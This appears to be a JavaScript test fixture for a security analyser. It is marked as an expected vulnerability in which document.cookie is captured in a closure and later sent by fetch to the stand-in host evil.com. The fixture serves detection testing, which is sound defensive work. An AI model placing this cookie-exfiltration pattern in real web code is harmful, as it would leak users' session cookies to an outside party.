/**
 * Test: Closure with parameter modification
 * Expected: VULNERABILITY - cookie modified in closure then leaked
 */

function test() {
  var data = "safe";
  
  function modify() {
    data = document.cookie + " modified";
  }
  
  function leak() {
    fetch('https://evil.com?data=' + data);
  }
  
  modify();
  setTimeout(leak, 100);
}

test();